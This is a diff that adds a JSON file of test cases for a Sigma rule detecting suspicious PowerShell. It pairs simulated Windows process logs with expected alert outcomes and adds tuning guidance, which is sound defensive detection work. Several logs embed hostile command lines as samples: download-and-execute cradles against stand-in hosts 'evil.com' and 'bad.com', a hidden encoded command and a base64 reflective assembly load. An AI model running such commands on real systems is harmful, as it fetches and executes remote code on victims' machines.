@@ -1,0 +1,88 @@
+{
+  "rule": "Sigma_rules/execution/encoded_powershell.yaml",
+  "title": "Suspicious PowerShell Execution Test Cases",
+  "atomic_red_team": ["T1059.001", "T1027"],
+  
+  "test_cases": [
+    {
+      "name": "Encoded command with hidden window - Should Detect",
+      "expected": "alert",
+      "log": {
+        "EventType": "ProcessCreate",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8A...",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "User": "CORP\\user"
+      }
+    },
+    {
+      "name": "Download cradle IEX - Should Detect",
+      "expected": "alert",
+      "log": {
+        "EventType": "ProcessCreate",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "User": "CORP\\user"
+      }
+    },
+    {
+      "name": "Office spawning PowerShell with download - Should Detect",
+      "expected": "alert",
+      "note": "High confidence - Office should rarely spawn PowerShell",
+      "log": {
+        "EventType": "ProcessCreate",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -ep bypass Invoke-WebRequest -Uri http://bad.com/payload",
+        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "User": "CORP\\user"
+      }
+    },
+    {
+      "name": "Reflection Assembly Load - Should Detect",
+      "expected": "alert",
+      "log": {
+        "EventType": "ProcessCreate",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe [Reflection.Assembly]::Load([Convert]::FromBase64String($data))",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "User": "CORP\\user"
+      }
+    },
+    {
+      "name": "SCCM encoded command - Should NOT Detect",
+      "expected": "no_alert",
+      "log": {
+        "EventType": "ProcessCreate",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -enc JABzAG... Microsoft\\ConfigMgr\\...",
+        "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe",
+        "User": "NT AUTHORITY\\SYSTEM"
+      }
+    },
+    {
+      "name": "Simple Get-Process command - Should NOT Detect",
+      "expected": "no_alert",
+      "log": {
+        "EventType": "ProcessCreate",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe Get-Process | Where-Object {$_.CPU -gt 100}",
+        "ParentImage": "C:\\Windows\\explorer.exe",
+        "User": "CORP\\admin"
+      }
+    }
+  ],
+
+  "tuning_guidance": {
+    "high_confidence_combinations": [
+      "Office parent + any suspicious flag",
+      "Encoded + hidden window + download",
+      "Reflection.Assembly.Load + FromBase64String"
+    ],
+    "environment_tuning": [
+      "Identify your automation tools (Ansible, Chef, Puppet)",
+      "Verify SCCM/Intune parent process paths",
+      "Baseline normal encoded command usage before alerting"
+    ]
+  }
+}
